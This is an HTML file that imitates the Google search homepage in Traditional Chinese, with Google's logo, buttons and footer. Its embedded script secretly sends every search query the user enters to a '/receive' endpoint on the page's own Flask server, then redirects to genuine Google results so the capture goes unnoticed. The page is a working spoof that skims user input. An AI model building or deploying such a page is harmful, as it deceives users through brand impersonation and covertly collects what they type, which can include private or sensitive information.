<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google 搜尋</title>
    <link href="https://fonts.googleapis.com/css2?family=Product+Sans&display=swap" rel="stylesheet">
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #ffffff;
            font-family: 'Product Sans', Arial, sans-serif;
            color: #202124;
        }
        .header {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            box-sizing: border-box;
            font-size: 14px;
            color: #5f6368;
            position: fixed; /* Fixes header at the top */
            top: 0;
            background-color: #fff;
            z-index: 1000;
        }
        .header-left, .header-right {
            display: flex;
            align-items: center;
        }
        .header-left a, .header-right a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 10px;
        }
        .header img {
            cursor: pointer;
        }
        .header-right img {
            margin-right: 10px; /* Add some space between the grid icon and "登入" */
        }
        .logo {
            margin-top: 200px;  /* Adjust for the fixed header */
        }
        .logo img {
            width: 150px;  /* Adjust Google logo size */
        }
        .search-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 300px; /* Limit the width of the search box */
            margin-top: -200px; /* Move the search box upwards */
        }
        .search-box {
            display: flex;
            align-items: center;
            width: 100%;
            padding: 8px;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
            background-color: #ffffff;
        }
        .search-box input[type="text"] {
            flex-grow: 1;
            padding: 0 10px;
            font-size: 16px;
            border: none;
            outline: none;
            height: 30px;
            margin-right: 8px;
        }
        .search-icons {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .search-icons img {
            width: 20px;
            height: 20px;
            cursor: pointer;
        }
        .buttons {
            display: flex;
            justify-content: center;
            width: 100%;
            max-width: 500px;
            margin-top: 16px;
        }
        .buttons button {
            background-color: #f8f9fa;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            color: #3c4043;
            font-size: 14px;
            margin: 8px 4px;
            padding: 10px 16px;
            cursor: pointer;
        }
        .buttons button:hover {
            border: 1px solid #dadce0;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
        }
        .footer {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 12px;
            padding: 10px 20px;
            color: #5f6368;
        }
        .footer a {
            margin: 5px 0;
            color: #5f6368;
            text-decoration: none;
        }
        @media (max-width: 600px) {
            .header-left, .header-right {
                display: flex;
                justify-content: center;
                width: 100%;
            }
            .header-left {
                justify-content: flex-start;
            }
            .header-right {
                justify-content: flex-end;
            }
            .logo img {
                width: 120px;
            }
            .search-box {
                padding: 6px; /* Reduce padding to shorten the search box */
            }
            .search-box input[type="text"] {
                font-size: 14px;
                height: 28px;
                margin-right: 8px;
            }
            .search-icons img {
                width: 18px;
                height: 18px;
            }
            .buttons button {
                font-size: 12px;
                padding: 8px 12px;
                margin: 8px 2px;
            }
        }
    </style>
    <script>
        async function searchGoogle(event) {
            event.preventDefault();  // Prevent form submission from refreshing the page

            const inputData = document.getElementById('searchInput').value;
            if (!inputData) return;

            try {
                // Submit data to Flask
                await fetch('/receive', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams({ q: inputData })
                });

                // Open Google search results
                window.location.href = `https://www.google.com/search?q=${encodeURIComponent(inputData)}`;
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</head>
<body>
    <div class="header">
        <div class="header-left">
            <img src="https://img.icons8.com/material-rounded/24/000000/menu.png" alt="Menu">
            <a href="#">全部</a>
            <a href="#">圖片</a>
        </div>
        <div class="header-right">
<img src="https://img.icons8.com/ios-filled/50/000000/grid.png" alt="Grid" style="width: 25px; height: 25px;">

            <a href="#">登入</a>
        </div>
    </div>

    <div class="logo">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
    </div>

    <div class="search-container">
        <div class="search-box">
            <form id="inputForm" onsubmit="searchGoogle(event)">
                <input type="text" id="searchInput" name="q" placeholder="搜尋 Google 或輸入網址" required>
            </form>
        </div>
        <div class="buttons">
            <button onclick="searchGoogle(event)">Google 搜尋</button>
            <button onclick="searchGoogle(event)">好手氣</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">台灣</a>
        <div>
            <a href="#">深色主題：關閉</a>
            <a href="#">設定</a>
            <a href="#">隱私權</a>
            <a href="#">服務條款</a>
        </div>
    </div>
</body>
</html>
